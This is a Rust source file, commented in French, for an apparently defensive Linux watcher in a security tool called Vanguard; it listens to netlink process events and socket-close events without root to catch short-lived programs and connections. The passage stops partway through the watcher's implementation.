//! Le veilleur : ce qui se passe entre deux passes de la surveillance horaire. La surveillance prend une photo par
//! heure ; un programme ou une connexion qui vit moins d'une heure entre deux photos n'y est jamais vu. Le veilleur
//! écoute deux flux que le noyau Linux ouvre aux comptes ordinaires, sans root ni eBPF, et sans aucun code chargé dans
//! le noyau :
//! - le connecteur de processus (NETLINK_CONNECTOR, groupe CN_IDX_PROC ; Linux 6.6 et plus sans droits) : chaque
//!   fork, exec et fin de processus, de tous les comptes, même de quelques millisecondes ;
//! - les fins de prises de sock_diag (groupes « destroy ») : chaque connexion TCP ou UDP au moment où elle se ferme,
//!   adresses et ports, même brève.
//!
//! Ce qu'il ne voit pas, et dit tel quel : l'événement de lancement ne porte que le numéro du processus, et un
//! programme de quelques millisecondes peut être parti avant qu'on lise /proc (il est compté « parti », jamais jugé
//! sain) ; le programme d'une connexion fermée n'est jamais connu (le noyau ne donne ni le compte ni la prise à ce
//! moment-là).
//!
//! Il observe seulement : rien n'est arrêté ni envoyé. Les programmes sont jugés par les fonctions de COM-PRG-001
//! (`chasse::juger_programme`), les connexions par les serveurs de commande des listes déjà téléchargées ; ce qui
//! est grave va au journal du tableau de bord et en notification, à débit borné. Il ne lit, de chaque processus, que
//! /proc/<pid>/exe, cmdline et status : jamais les fichiers des agents d'IA (conversations, history.jsonl,
//! shell-snapshots), ni rien d'autre de leur dossier.
//!
//! Le service est une unité systemd de l'utilisateur, Type=simple, coupée par défaut et posée seulement après accord
//! (`vanguard veilleur on`) ; `vanguard veilleur off` la retire exactement.

use std::collections::{HashMap, HashSet, VecDeque};
use std::io::{IsTerminal, Read};
use std::net::{IpAddr, SocketAddr};
use std::path::PathBuf;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::{Duration, Instant};

use crate::langue::Reponse;
use crate::machine::chasse::{self, EnMarche};
use crate::machine::regles::{Os, regle};
use crate::machine::{Constat, alerte, impossible, ok};
use crate::protection::sortantes::ServeursDeCommande;
use crate::reseau::tableau::{self, Genre};
use crate::risk::Niveau;
use crate::ui::{GRIS, RESET, VERT, afficher_aligne, couleur, demander, titre};
use crate::{tr, trf, trp};

regle!(
    "LNX-SUR-001",
    Os::Linux,
    380,
    (
        "veilleur des lancements et des connexions",
        "watcher of launches and connections"
    ),
    &[],
    || vec![constat()]
);

/// Le nom de l'unité de l'utilisateur.
const UNITE: &str = "vanguard-veilleur.service";
/// La sortie d'un refus (noyau trop ancien, abonnement refusé, root) : l'unité ne le relance pas
/// (RestartPreventExitStatus), puisque relancer n'y changerait rien.
const SORTIE_REFUS: i32 = 77;

// ───────────────────────────── Décodage, pur ─────────────────────────────

const NETLINK_CONNECTOR: i32 = 11;
const NETLINK_SOCK_DIAG: i32 = 4;
const CN_IDX_PROC: u32 = 1;
const CN_VAL_PROC: u32 = 1;
const NLMSG_DONE: u16 = 3;
const PROC_CN_MCAST_LISTEN: u32 = 1;
const PROC_CN_MCAST_IGNORE: u32 = 2;
const PROC_EVENT_NONE: u32 = 0;
const PROC_EVENT_FORK: u32 = 1;
const PROC_EVENT_EXEC: u32 = 2;
const PROC_EVENT_EXIT: u32 = 0x8000_0000;
const SOCK_DIAG_BY_FAMILY: u16 = 20;
const INET_DIAG_PROTOCOL: u16 = 10;
/// Les quatre groupes « destroy » de sock_diag : TCP et UDP, IPv4 et IPv6.
const GROUPES_FINS_DE_PRISES: u32 = 0xF;
const AF_INET: u8 = 2;
const AF_INET6: u8 = 10;

/// La demande d'abonnement (`PROC_CN_MCAST_LISTEN`) ou de désabonnement (`PROC_CN_MCAST_IGNORE`) au connecteur de
/// processus : en-tête netlink (16 octets), cn_msg (20), puis l'opération sur 4 octets. Pas la forme à 8 octets avec
/// un filtre : le filtre jette aussi l'accusé (relevé), et l'abonnement ne se prouverait plus. `jeton` va dans les
/// numéros et dans le champ ack de cn_msg : le noyau renvoie ack + 1 dans son accusé.
fn demande_abonnement(op: u32, jeton: u32) -> [u8; 40] {
    let mut d = [0u8; 40];
    d[0..4].copy_from_slice(&40u32.to_ne_bytes());
    d[4..6].copy_from_slice(&NLMSG_DONE.to_ne_bytes());
    d[8..12].copy_from_slice(&jeton.to_ne_bytes());
    d[16..20].copy_from_slice(&CN_IDX_PROC.to_ne_bytes());
    d[20..24].copy_from_slice(&CN_VAL_PROC.to_ne_bytes());
    d[24..28].copy_from_slice(&jeton.to_ne_bytes());
    d[28..32].copy_from_slice(&jeton.to_ne_bytes());
    d[32..34].copy_from_slice(&4u16.to_ne_bytes());
    d[36..40].copy_from_slice(&op.to_ne_bytes());
    d
}

/// Un événement du connecteur de processus.
#[derive(Debug, Clone, PartialEq, Eq)]
enum EvenementProc {
    /// La réponse à une demande d'abonnement : son numéro (celui du compteur du noyau, pas le nôtre), `ack` (le
    /// nôtre plus un) et l'erreur du noyau.
    Accuse { seq: u32, ack: u32, err: u32 },
    /// Un processus en a créé un autre (les fils d'un même processus sont laissés de côté).
    Fourche { parent: u32, enfant: u32 },
    /// Un processus a lancé un programme (exec).
    Lancement { pid: u32 },
    /// Un processus s'est terminé ; `parent` quand le noyau le donne.
    Fin { pid: u32, parent: Option<u32>, code: u32 },
    /// Le reste (changement de compte, de nom, copie de mémoire…) : rien à en faire ici.
    Autre,
}

fn u32_a(octets: &[u8], pos: usize) -> Option<u32> {
    Some(u32::from_ne_bytes(octets.get(pos..pos + 4)?.try_into().ok()?))
}

/// Les événements d'un morceau reçu du connecteur. Chaque message : nlmsghdr de type NLMSG_DONE, cn_msg (idx et val à
/// 1, puis seq, ack, longueur des données) et proc_event (what, cpu, horodatage, puis les données propres à
/// l'événement, à 16 octets de son début). Un message tronqué ou étranger est ignoré, jamais deviné.
fn lire_evenements_proc(octets: &[u8]) -> Vec<EvenementProc> {
    let mut evenements = Vec::new();
    for (genre, corps) in crate::reseau::scan::messages_netlink(octets) {
        if genre != NLMSG_DONE || corps.len() < 20 {
            continue;
        }
        let (Some(idx), Some(val), Some(seq), Some(ack)) =
            (u32_a(corps, 0), u32_a(corps, 4), u32_a(corps, 8), u32_a(corps, 12))
        else {
            continue;
        };
        let longueur = usize::from(u16::from_ne_bytes([corps[16], corps[17]]));
        if idx != CN_IDX_PROC || val != CN_VAL_PROC {
            continue;
        }
        let Some(donnees) = corps.get(20..20 + longueur) else {
            continue;
        };
        let Some(what) = u32_a(donnees, 0) else {
            continue;
        };
        let champ = |pos: usize| u32_a(donnees, 16 + pos);
        let evenement = match what {
            PROC_EVENT_NONE => champ(0).map(|err| EvenementProc::Accuse { seq, ack, err }),
            PROC_EVENT_FORK => match (champ(4), champ(8), champ(12)) {
                // Un fil (pid ≠ tgid) n'est pas un nouveau processus.
                (Some(parent), Some(pid), Some(tgid)) if pid == tgid => {
                    Some(EvenementProc::Fourche { parent, enfant: tgid })
                }
                (Some(_), Some(_), Some(_)) => Some(EvenementProc::Autre),
                _ => None,
            },
            PROC_EVENT_EXEC => champ(4).map(|pid| EvenementProc::Lancement { pid }),
            PROC_EVENT_EXIT => match (champ(0), champ(4), champ(8)) {
                (Some(pid), Some(tgid), Some(code)) if pid == tgid => Some(EvenementProc::Fin {
                    pid,
                    parent: champ(20).filter(|&p| p != 0),
                    code,
                }),
                (Some(_), Some(_), Some(_)) => Some(EvenementProc::Autre),
                _ => None,
            },
            _ => Some(EvenementProc::Autre),
        };
        evenements.extend(evenement);
    }
    evenements
}

/// Une prise TCP ou UDP qui vient de se fermer. `locale` est toujours le côté de cet ordinateur.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) struct FinPrise {
    /// 6 (TCP) ou 17 (UDP) ; `None` si le noyau ne l'a pas dit.
    pub protocole: Option<u8>,
    pub locale: SocketAddr,
    pub distante: SocketAddr,
    pub etat: u8,
}

/// Les fins de prises d'un morceau reçu de sock_diag : inet_diag_msg (72 octets : famille, état, ports dans l'ordre
/// du réseau, adresses sur 16 octets…) puis ses attributs, dont le protocole. Une adresse IPv4 vue par une prise
/// IPv6 (« ::ffff:192.0.2.1 ») est ramenée à sa forme IPv4, celle des listes.
fn lire_fins_de_prises(octets: &[u8]) -> Vec<FinPrise> {
    let mut fins = Vec::new();
    for (genre, corps) in crate::reseau::scan::messages_netlink(octets) {
        if genre != SOCK_DIAG_BY_FAMILY || corps.len() < 72 {
            continue;
        }
        let adresse = |pos: usize| -> Option<IpAddr> {
            match corps[0] {
                AF_INET => Some(IpAddr::from(<[u8; 4]>::try_from(&corps[pos..pos + 4]).ok()?)),
                AF_INET6 => Some(IpAddr::from(<[u8; 16]>::try_from(&corps[pos..pos + 16]).ok()?).to_canonical()),
                _ => None,
            }
        };
        let (Some(source), Some(destination)) = (adresse(8), adresse(24)) else {
            continue;
        };
        let port = |pos: usize| u16::from_be_bytes([corps[pos], corps[pos + 1]]);
        let mut protocole = None;
        let mut pos = 72;
        while let Some(attribut) = corps.get(pos..pos + 4) {
            let longueur = usize::from(u16::from_ne_bytes([attribut[0], attribut[1]]));
            if longueur < 4 {
                break;
            }
            if u16::from_ne_bytes([attribut[2], attribut[3]]) == INET_DIAG_PROTOCOL && longueur >= 5 {
                protocole = corps.get(pos + 4).copied();
            }
            pos += longueur.next_multiple_of(4);
        }
        fins.push(FinPrise {
            protocole,
            locale: SocketAddr::new(source, port(4)),
            distante: SocketAddr::new(destination, port(6)),
            etat: corps[1],
        });
    }
    fins
}

/// La version du noyau (« 6.10.2-arch1-1 ») suffit-elle ? Linux 6.6 est le premier qui ouvre le connecteur de
/// processus aux comptes ordinaires. `None` : version illisible.
fn noyau_suffisant(release: &str) -> Option<bool> {
    let mut morceaux = release.trim().split('.');
    let nombre = |m: Option<&str>| -> Option<u32> {
        let m = m?;
        let fin = m.find(|c: char| !c.is_ascii_digit()).unwrap_or(m.len());
        m[..fin].parse().ok()
    };
    let majeur = nombre(morceaux.next())?;
    let mineur = nombre(morceaux.next())?;
    Some((majeur, mineur) >= (6, 6))
}

fn release_du_noyau() -> Option<String> {
    std::fs::read_to_string("/proc/sys/kernel/osrelease")
        .ok()
        .map(|r| r.trim().to_string())
}

/// La ligne de commande de /proc/<pid>/cmdline : ses morceaux séparés par NUL, joints par une espace, comme la chasse
/// les lit. `None` : vide (processus terminé, ou fil du noyau).
fn ligne_de_commande(octets: &[u8]) -> Option<String> {
    let ligne = octets
        .split(|&b| b == 0)
        .filter(|m| !m.is_empty())
        .map(String::from_utf8_lossy)
        .collect::<Vec<_>>()
        .join(" ");
    (!ligne.is_empty()).then_some(ligne)
}

/// Ce qu'on a pu lire d'un programme au moment de son lancement.
#[derive(Debug, Clone)]
pub(crate) enum Lecture {
    /// Son programme ou sa ligne de commande (ceux d'un autre compte : la ligne seule).
    Complet(EnMarche),
    /// Seulement son nom court, donné par le noyau (programme déjà terminé, pas encore ramassé par son parent).
    NomSeul(EnMarche),
    /// Plus rien : parti avant qu'on le lise. Jamais jugé, jamais compté comme sain.
    Parti,
    /// Pas lu du tout : une rafale de lancements (plus de `LECTURES_PAR_SECONDE`).
    NonLu,
}

/// La lecture d'un processus, d'après ce que /proc a rendu : le lien exe, cmdline et status. Un processus terminé
/// mais pas encore ramassé (« zombie ») n'a plus ni programme ni ligne de commande, mais encore son nom.
fn lecture_de(pid: u32, exe: Option<String>, cmdline: Option<&[u8]>, status: Option<&str>) -> Lecture {
    let champ = |nom: &str| status.and_then(|s| s.lines().find_map(|l| l.strip_prefix(nom)).map(str::trim));
    let nom = champ("Name:").map(str::to_string);
    let parent = champ("PPid:").and_then(|p| p.parse().ok()).filter(|&p: &u32| p != 0);
    let zombie = champ("State:").is_some_and(|e| e.starts_with('Z') || e.starts_with('X'));
    let ligne = cmdline.and_then(ligne_de_commande);
    let nom_seul = |nom: String| {
        Lecture::NomSeul(EnMarche {
            pid,
            parent,
            nom,
            ..EnMarche::default()
        })
    };
    if zombie || (ligne.is_none() && exe.is_none()) {
        return nom.map_or(Lecture::Parti, nom_seul);
    }
    let sans_fichier = exe.as_deref().is_some_and(|l| l.ends_with(" (deleted)"));
    let chemin = exe.map(|l| l.strip_suffix(" (deleted)").map_or_else(|| l.clone(), str::to_string));
    let nom = nom.unwrap_or_else(|| {
        let premier = chemin
            .as_deref()
            .or_else(|| ligne.as_deref().and_then(|l| l.split_whitespace().next()))
            .unwrap_or("");
        chasse::nom_de_fichier(premier).to_string()
    });
    Lecture::Complet(EnMarche {
        pid,
        parent,
        nom,
        chemin,
        ligne,
        sans_fichier,
        ne: None,
    })
}

// ───────────────────────────── Table des processus, bornée ─────────────────────────────

/// Au plus tant de processus connus (environ 1 Mio) : au-delà, les disparus sont balayés, puis les plus anciens
/// oubliés. Un ordinateur de maison en a quelques centaines.
const TABLE_MAX: usize = 16_384;
/// Un nom de processus du noyau fait 15 octets ; on en garde 16 au plus, contre un nom fabriqué.
const NOM_MAX: usize = 16;
/// La lignée montrée : le programme et trois ancêtres au plus (« npm → node → sh »).
const LIGNEE_MAX: usize = 4;

#[derive(Debug, Clone)]
struct Fiche {
    parent: Option<u32>,
    nom: String,
    /// Vanguard, ou lancé par lui : jamais jugé, comme au bilan.
    de_vanguard: bool,
    /// Son numéro d'entrée, pour que l'éviction des plus anciens ne retire pas une fiche reprise depuis.
    entree: u64,
}

/// Ce que le veilleur sait des processus : de quoi remonter une lignée et reconnaître Vanguard. Bornée.
#[derive(Debug, Default)]
struct Table {
    fiches: HashMap<u32, Fiche>,
    ordre: VecDeque<(u32, u64)>,
    entrees: u64,
}

fn nom_borne(nom: &str) -> String {
    let mut fin = nom.len().min(NOM_MAX);
    while !nom.is_char_boundary(fin) {
        fin -= 1;
    }
    nom[..fin].to_string()
}

impl Table {
    fn inserer(&mut self, pid: u32, parent: Option<u32>, nom: &str, de_vanguard: bool, vivant: &dyn Fn(u32) -> bool) {
        if !self.fiches.contains_key(&pid) && self.fiches.len() >= TABLE_MAX {
            self.fiches.retain(|&p, _| vivant(p));
            while self.fiches.len() >= TABLE_MAX {
                let Some((p, entree)) = self.ordre.pop_front() else {
                    break;
                };
                if self.fiches.get(&p).is_some_and(|f| f.entree == entree) {
                    self.fiches.remove(&p);
                }
            }
        }
        self.entrees += 1;
        self.fiches.insert(
            pid,
            Fiche {
                parent,
                nom: nom_borne(nom),
                de_vanguard,
                entree: self.entrees,
            },
        );
        self.ordre.push_back((pid, self.entrees));
        // L'ordre garde aussi les entrées retirées depuis : il est refait quand il devient deux fois trop long.
        if self.ordre.len() > 2 * TABLE_MAX {
            let fiches = &self.fiches;
            self.ordre
                .retain(|(p, entree)| fiches.get(p).is_some_and(|f| f.entree == *entree));
        }
    }

    fn fourche(&mut self, parent: u32, enfant: u32, vivant: &dyn Fn(u32) -> bool) {
        let (nom, de_vanguard) = self
            .fiches
            .get(&parent)
            .map_or((String::new(), false), |f| (f.nom.clone(), f.de_vanguard));
        self.inserer(enfant, Some(parent), &nom, de_vanguard, vivant);
    }

    /// Un lancement : le nom et le parent lus (s'ils l'ont été), et la marque de Vanguard si le programme est le sien.
    fn lancement(&mut self, pid: u32, lu: Option<&EnMarche>, de_vanguard: bool, vivant: &dyn Fn(u32) -> bool) {
        let ancienne = self.fiches.get(&pid).cloned();
        let parent = lu.and_then(|p| p.parent).or(ancienne.as_ref().and_then(|f| f.parent));
        let nom = lu.map_or_else(
            || ancienne.as_ref().map(|f| f.nom.clone()).unwrap_or_default(),
            |p| p.nom.clone(),
        );
        let de_vanguard = de_vanguard
            || ancienne.as_ref().is_some_and(|f| f.de_vanguard)
            || parent.is_some_and(|p| self.fiches.get(&p).is_some_and(|f| f.de_vanguard));
        match self.fiches.get_mut(&pid) {
            Some(f) => {
                f.parent = parent;
                f.nom = nom_borne(&nom);
                f.de_vanguard = de_vanguard;
            }
            None => self.inserer(pid, parent, &nom, de_vanguard, vivant),
        }
    }

    fn fin(&mut self, pid: u32) {
        self.fiches.remove(&pid);
    }

    fn de_vanguard(&self, pid: u32) -> bool {
        self.fiches.get(&pid).is_some_and(|f| f.de_vanguard)
    }

    fn parent(&self, pid: u32) -> Option<u32> {
        self.fiches.get(&pid).and_then(|f| f.parent)
    }

    /// Les noms de la lignée, de l'ancêtre au programme : quatre au plus, arrêtée sur une boucle de parents.
    fn lignee(&self, pid: u32) -> Vec<String> {
        let mut noms = Vec::new();
        let mut vus = HashSet::new();
        let mut courant = Some(pid);
        while let Some(p) = courant
            && noms.len() < LIGNEE_MAX
            && vus.insert(p)
        {
            let Some(f) = self.fiches.get(&p) else { break };
            noms.push(if f.nom.is_empty() {
                format!("PID {p}")
            } else {
                f.nom.clone()
            });
            courant = f.parent;
        }
        noms.reverse();
        noms
    }
}

// ───────────────────────────── Prises netlink, par libc ─────────────────────────────

/// Pourquoi le veilleur ne peut pas s'ouvrir.
#[derive(Debug, Clone, PartialEq, Eq)]
pub(crate) enum Refus {
    /// Le connecteur n'existe pas ici (EPROTONOSUPPORT) : noyau sans CONFIG_PROC_EVENTS, ou espace réseau à part.
    Absent,
    /// Le noyau refuse sans droits (EPERM).
    Interdit,
    /// Aucun accusé de notre abonnement en 2 secondes.
    SansAccuse,
    Erreur(i32),
}

impl Refus {
    pub(crate) fn raison(&self) -> String {
        match self {
            Refus::Absent => tr!(
                "Ce noyau n'a pas le connecteur de processus (CONFIG_PROC_EVENTS), ou il n'existe pas ici (espace réseau à part) : rien n'est installé.",
                "This kernel has no process connector (CONFIG_PROC_EVENTS), or it does not exist here (separate network namespace): nothing is installed."
            )
            .to_string(),
            Refus::Interdit => tr!(
                "Le noyau refuse l'abonnement au connecteur de processus sans droits (EPERM) : rien n'est installé ; Vanguard ne le demandera pas en root.",
                "The kernel refuses the process connector subscription without rights (EPERM): nothing is installed; Vanguard will not ask for it as root."
            )
            .to_string(),
            Refus::SansAccuse => tr!(
                "Le noyau n'a pas confirmé l'abonnement en 2 secondes (conteneur, espace de noms ?) : rien n'est installé. Ce qui arriverait quand même viendrait d'un autre abonné et ne se compte pas.",
                "The kernel did not confirm the subscription within 2 seconds (container, namespace?): nothing is installed. Whatever still arrived would come from another subscriber and does not count."
            )
            .to_string(),
            Refus::Erreur(e) => trf!(
                "Le connecteur de processus ne s'ouvre pas ({}) : rien n'est installé.",
                "The process connector does not open ({}): nothing is installed.",
                std::io::Error::from_raw_os_error(*e)
            ),
        }
    }

    fn depuis_errno(e: i32) -> Refus {
        match e {
            // ECONNREFUSED : la prise s'ouvre, mais aucun connecteur n'y répond (un espace réseau à part, celui
            // de `unshare -rn`).
            libc::EPROTONOSUPPORT | libc::ECONNREFUSED => Refus::Absent,
            libc::EPERM | libc::EACCES => Refus::Interdit,
            e => Refus::Erreur(e),
        }
    }
}

fn errno() -> i32 {
    std::io::Error::last_os_error().raw_os_error().unwrap_or(0)
}

/// Une prise netlink à nous, fermée une seule fois quand elle disparaît.
struct Prise(i32);

impl Drop for Prise {
    fn drop(&mut self) {
        // SAFETY : le descripteur a été ouvert par `ouvrir_prise` et n'est fermé qu'ici, une fois.
        unsafe {
            libc::close(self.0);
        }
    }
}

/// Le tampon de réception demandé : une rafale de lancements (une compilation) en remplit vite un petit. Sans droits,
/// le noyau le plafonne (rmem_max) ; la taille obtenue est relue et notée.
const TAMPON_VOULU: i32 = 4 << 20;

fn adresse_netlink(groupes: u32) -> libc::sockaddr_nl {
    // SAFETY : sockaddr_nl est une structure C sans pointeur, valide remplie de zéros (son bourrage est privé).
    let mut adresse: libc::sockaddr_nl = unsafe { std::mem::zeroed() };
    #[allow(clippy::cast_possible_truncation, clippy::cast_sign_loss)]
    {
        adresse.nl_family = libc::AF_NETLINK as u16;
    }
    adresse.nl_groups = groupes;
    adresse
}

fn taille_de<T>() -> libc::socklen_t {
    libc::socklen_t::try_from(std::mem::size_of::<T>()).unwrap_or(0)
}

/// Une prise netlink du protocole donné, abonnée aux `groupes`. On ne pose jamais NETLINK_NO_ENOBUFS : il cacherait
/// les pertes, qu'on veut compter.
fn ouvrir_prise(protocole: i32, groupes: u32) -> Result<Prise, Refus> {
    // SAFETY : socket ne prend que des entiers ; le descripteur rendu est confié à `Prise`, qui le fermera.
    let fd = unsafe { libc::socket(libc::AF_NETLINK, libc::SOCK_DGRAM | libc::SOCK_CLOEXEC, protocole) };
    if fd < 0 {
        return Err(Refus::depuis_errno(errno()));
    }
    let prise = Prise(fd);
    let adresse = adresse_netlink(groupes);
    let voulu = TAMPON_VOULU;
    // SAFETY : chaque appel reçoit un pointeur vers une valeur à nous, vivante pendant l'appel, et sa taille exacte.
    let lie = unsafe {
        libc::setsockopt(
            fd,
            libc::SOL_SOCKET,
            libc::SO_RCVBUF,
            (&raw const voulu).cast(),
            taille_de::<i32>(),
        );
        libc::bind(fd, (&raw const adresse).cast(), taille_de::<libc::sockaddr_nl>())
    };
    if lie < 0 {
        return Err(Refus::depuis_errno(errno()));
    }
    Ok(prise)
}

/// La taille du tampon de réception obtenue (le noyau la double pour sa comptabilité, d'où ce qu'il rend).
fn tampon_obtenu(prise: &Prise) -> usize {
    let mut taille: i32 = 0;
    let mut longueur = taille_de::<i32>();
    // SAFETY : getsockopt écrit au plus `longueur` octets dans `taille`, à nous et vivante pendant l'appel.
    let r = unsafe {
        libc::getsockopt(
            prise.0,
            libc::SOL_SOCKET,
            libc::SO_RCVBUF,
            (&raw mut taille).cast(),
            &raw mut longueur,
        )
    };
    if r < 0 { 0 } else { usize::try_from(taille).unwrap_or(0) }
}

/// Envoie un message au noyau (adresse netlink 0).
fn envoyer(prise: &Prise, message: &[u8]) -> bool {
    let adresse = adresse_netlink(0);
    // SAFETY : le message et l'adresse sont à nous, vivants pendant l'appel, passés avec leur taille exacte.
    let envoye = unsafe {
        libc::sendto(
            prise.0,
            message.as_ptr().cast(),
            message.len(),
            0,
            (&raw const adresse).cast(),
            taille_de::<libc::sockaddr_nl>(),
        )
    };
    usize::try_from(envoye).ok() == Some(message.len())
}

enum Recu {
    Octets(usize),
    /// Le tampon a débordé (ENOBUFS) : des événements sont perdus.
    Perdus,
    /// Rien à lire pour l'instant (EAGAIN, EINTR).
    Vide,
    Erreur(i32),
}

fn recevoir(prise: &Prise, tampon: &mut [u8]) -> Recu {
    // SAFETY : recv écrit au plus `tampon.len()` octets dans le tampon, à nous ; MSG_DONTWAIT : jamais bloquant.
    let n = unsafe { libc::recv(prise.0, tampon.as_mut_ptr().cast(), tampon.len(), libc::MSG_DONTWAIT) };
    match usize::try_from(n) {
        Ok(0) => Recu::Vide,
        Ok(n) => Recu::Octets(n),
        Err(_) => match errno() {
            libc::ENOBUFS => Recu::Perdus,
            libc::EAGAIN | libc::EINTR => Recu::Vide,
            e => Recu::Erreur(e),
        },
    }
}

/// Attend qu'une des prises ait quelque chose à lire, `ms` millisecondes au plus ; rend, pour chacune, si elle a de
/// quoi lire (ou une erreur, un débordement par exemple, que recv dira).
fn attendre(prises: &[&Prise], ms: i32) -> Vec<bool> {
    let mut attentes: Vec<libc::pollfd> = prises
        .iter()
        .map(|p| libc::pollfd {
            fd: p.0,
            events: libc::POLLIN,
            revents: 0,
        })
        .collect();
    let nombre = libc::nfds_t::try_from(attentes.len()).unwrap_or(0);
    // SAFETY : poll lit et écrit `nombre` structures du vecteur, à nous et vivant pendant l'appel.
    let r = unsafe { libc::poll(attentes.as_mut_ptr(), nombre, ms) };
    attentes
        .iter()
        .map(|a| r > 0 && a.revents & (libc::POLLIN | libc::POLLERR) != 0)
        .collect()
}

/// Demandé par SIGTERM (systemctl stop) ou SIGINT : le service finit son tour, se désabonne et sort.
static ARRET: AtomicBool = AtomicBool::new(false);

extern "C" fn sur_signal(_: libc::c_int) {
    // Rien d'autre ici : seul un accès atomique est sûr dans un gestionnaire de signal.
    ARRET.store(true, Ordering::SeqCst);
}

fn ecouter_les_signaux() {
    // SAFETY : la structure est remplie de zéros puis complétée (gestionnaire, masque vide, aucun drapeau) ; le
    // gestionnaire ne fait qu'écrire un booléen atomique, ce qui est sûr dans un signal.
    unsafe {
        let mut action: libc::sigaction = std::mem::zeroed();
        action.sa_sigaction = sur_signal as extern "C" fn(libc::c_int) as libc::sighandler_t;
        libc::sigemptyset(&raw mut action.sa_mask);
        libc::sigaction(libc::SIGTERM, &raw const action, std::ptr::null_mut());
        libc::sigaction(libc::SIGINT, &raw const action, std::ptr::null_mut());
    }
}

fn root() -> bool {
    // SAFETY : geteuid n'a ni argument ni échec possible.
    unsafe { libc::geteuid() == 0 }
}

/// Le jeton de notre abonnement. L'accusé est envoyé à tout le groupe, et son numéro (seq) est celui du compteur
/// du noyau, qui l'écrase à l'envoi (send_msg de cn_proc.c ; relevé : notre seq ne revient jamais) ; seul son champ
/// ack, notre jeton plus un, prouve que le noyau nous a pris. Le bit haut posé : jamais l'ack = 1 d'un abonné qui
/// envoie 0. Les événements qui arrivent sans cet accusé viendraient d'un autre abonné.
fn jeton_d_abonnement() -> u32 {
    let nanos = std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.subsec_nanos())
        .unwrap_or_default();
    ((std::process::id() ^ nanos) | 0x8000_0000).min(u32::MAX - 1)
}

/// L'erreur rendue par le noyau dans l'accusé de notre abonnement (`jeton`), ou `None` si ce n'en est pas un.
fn notre_accuse(e: &EvenementProc, jeton: u32) -> Option<u32> {
    match *e {
        EvenementProc::Accuse { ack, err, .. } if ack == jeton.wrapping_add(1) => Some(err),
        _ => None,
    }
}

/// S'abonne et attend l'accusé, 2 secondes au plus.
fn ouvrir_connecteur() -> Result<Prise, Refus> {
    let prise = ouvrir_prise(NETLINK_CONNECTOR, CN_IDX_PROC)?;
    let jeton = jeton_d_abonnement();
    if !envoyer(&prise, &demande_abonnement(PROC_CN_MCAST_LISTEN, jeton)) {
        return Err(Refus::depuis_errno(errno()));
    }
    let limite = Instant::now() + Duration::from_secs(2);
    let mut tampon = vec![0u8; 16 << 10];
    while let Some(reste) = limite.checked_duration_since(Instant::now()) {
        let ms = i32::try_from(reste.as_millis()).unwrap_or(2000).max(1);
        if !attendre(&[&prise], ms)[0] {
            continue;
        }
        loop {
            match recevoir(&prise, &mut tampon) {
                Recu::Octets(n) => {
                    for e in lire_evenements_proc(&tampon[..n]) {
                        if let Some(err) = notre_accuse(&e, jeton) {
                            return match i32::try_from(err).unwrap_or(-1) {
                                0 => Ok(prise),
                                libc::EPERM | libc::EACCES => Err(Refus::Interdit),
                                e => Err(Refus::Erreur(e)),
                            };
                        }
                    }
                }
                Recu::Perdus => {}
                Recu::Vide => break,
                Recu::Erreur(e) => return Err(Refus::Erreur(e)),
            }
        }
    }
    Err(Refus::SansAccuse)
}

// ───────────────────────────── Le veilleur ─────────────────────────────

/// Au-delà de tant de lectures de /proc par seconde (une compilation, un script qui boucle), les lancements sont
/// comptés « non lus » : le veilleur ne doit pas prendre tout un cœur.
const LECTURES_PAR_SECONDE: u32 = 500;
/// Ce qu'on lit au plus d'une ligne de commande.
const CMDLINE_MAX: u64 = 16 << 10;

/// Ce que le veilleur a vu pendant un tour.
#[derive(Debug)]
pub(crate) enum Vu {
    Lance(Lance),
    Prise(FinPrise),
    /// Le tampon d'un des flux a débordé : des événements sont perdus, au moins un.
    Perdus(u32),
}

/// Un programme lancé, tel que le veilleur a pu le lire.
#[derive(Debug)]
pub(crate) struct Lance {
    pub pid: u32,
    pub parent: Option<u32>,
    pub lecture: Lecture,
    pub lignee: Vec<String>,
    /// Vanguard ou lancé par lui : jamais jugé.
    pub de_vanguard: bool,
}

pub(crate) struct Veilleur {
    connecteur: Prise,
    /// Les fins de prises, ou pourquoi elles ne s'écoutent pas : les lancements se voient quand même.
    prises: Result<Prise, Refus>,
    table: Table,
    mon_programme: Option<String>,
    rafale: (Instant, u32),
    tampon: Vec<u8>,
    /// En pause (protection en temps réel coupée) : la table suit, mais /proc n'est plus lu.
    lire: bool,
}

fn vivant(pid: u32) -> bool {
    std::path::Path::new(&format!("/proc/{pid}")).exists()
}

fn mon_programme() -> Option<String> {
    std::env::current_exe().ok().map(|c| {
        let c = c.to_string_lossy();
        c.strip_suffix(" (deleted)").unwrap_or(&c).to_string()
    })
}

/// /proc/<pid>/exe, cmdline (bornée) et status, lus aussitôt et dans cet ordre : le programme part vite.
fn lire_proc(pid: u32) -> Lecture {
    let racine = PathBuf::from(format!("/proc/{pid}"));
    let exe = std::fs::read_link(racine.join("exe"))
        .ok()
        .map(|l| l.to_string_lossy().into_owned());
    let cmdline = std::fs::File::open(racine.join("cmdline")).ok().and_then(|f| {
        let mut octets = Vec::new();
        f.take(CMDLINE_MAX).read_to_end(&mut octets).ok().map(|_| octets)
    });
    let status = std::fs::read_to_string(racine.join("status")).ok();
    lecture_de(pid, exe, cmdline.as_deref(), status.as_deref())
}

impl Veilleur {
    /// Ouvre les deux flux. La table part des programmes déjà en marche, Vanguard et ce qu'il a lancé reconnus.
    pub(crate) fn ouvrir() -> Result<Veilleur, Refus> {
        let connecteur = ouvrir_connecteur()?;
        let prises = ouvrir_prise(NETLINK_SOCK_DIAG, GROUPES_FINS_DE_PRISES);
        let mon_programme = mon_programme();
        let mut table = Table::default();
        if let Some((liste, _)) = chasse::en_marche() {
            // Pas les ancêtres de Vanguard (systemd de l'utilisateur, le terminal) : tout ce qu'ils lancent
            // serait sinon écarté.
            let ecartes = chasse::de_vanguard(&liste, std::process::id(), mon_programme.as_deref());
            for p in &liste {
                table.inserer(p.pid, p.parent, &p.nom, ecartes.contains(&p.pid), &vivant);
            }
        }
        Ok(Veilleur {
            connecteur,
            prises,
            table,
            mon_programme,
            rafale: (Instant::now(), 0),
            tampon: vec![0u8; 64 << 10],
            lire: true,
        })
    }

    /// La taille du tampon obtenue pour le connecteur.
    fn tampon(&self) -> usize {
        tampon_obtenu(&self.connecteur)
    }

    /// Un tour : attendre `attente` au plus, puis tout lire de ce qui est arrivé. `Err` : une erreur que le service
    /// ne sait pas traiter (systemd le relance).
